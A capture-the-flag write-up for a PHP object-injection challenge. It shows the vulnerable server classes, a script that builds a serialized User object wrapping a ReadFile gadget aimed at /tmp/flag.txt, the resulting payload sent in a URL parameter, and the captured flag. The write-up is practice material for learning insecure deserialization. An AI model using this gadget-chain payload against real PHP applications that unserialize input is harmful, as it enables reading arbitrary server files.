# CTF Name – I Object!

- **Category:** category
- **Points:** points

## Challenge

> The Seekurity team has created a wonderful app to demonstrate how to pop your first PHP Objection Exploit. There is more than enough here to help you get the flag at /tmp/flag.txt

> See this as a nice tutorial to some more Objection challenges in the CTF (:

http://objection-ctf.seekurity.com.au:8234/

## Solution

Server code
```php
class ReadFile{
   public function __toString()
   {
      return file_get_contents(($this->filename));
   }
}

class User{
   public $username;
   public $isAdmin;

   public function PrintData(){
      if($this->isAdmin){
         echo $this->username . " is admin";
      } else {
         echo $this->username . "is not admin";
      }
   }
}
```

Payload generator code
```php
<?php 
   class ReadFile{
      public function __construct()
      {
         $this->filename = "/tmp/flag.txt";
      }
   }
   class User{
      public function __construct()
      {
         $this->username = new ReadFile();
         $this->isAdmin = True;
      }
   }
   $user = new User;
   echo serialize($user)

?>
```

Payload: 

`O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:13:"/tmp/flag.txt";}s:7:"isAdmin";b:1;}%`
http://objection-ctf.seekurity.com.au:8234/?r=O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:13:"/tmp/flag.txt";}s:7:"isAdmin";b:1;}

```
flag{My_V3ry_f1r5t_PHP_0bjection5_fl4g1}
```
